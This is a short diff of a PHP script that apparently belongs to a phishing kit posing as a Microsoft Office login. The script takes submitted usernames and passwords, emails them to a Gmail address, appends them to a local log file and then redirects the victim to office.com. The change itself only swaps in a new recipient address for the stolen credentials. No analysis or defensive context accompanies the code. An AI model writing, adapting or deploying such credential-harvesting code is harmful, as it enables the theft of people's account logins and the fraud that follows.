@@ -9,7 +9,7 @@ $message .= "
  [Username]      : ".$_POST['ml']."
  [PASSWORD]           : ".$_POST['pw']."
 -------------------------------------------------\n";
-mail("jerryjfinance@gmail.com",$subject,$message,$headers);
+mail("shanondan2007@gmail.com",$subject,$message,$headers);
 $text = fopen('../rezlt.txt', 'a');
 fwrite($text, $message);
 header("Location: https://www.office.com/");
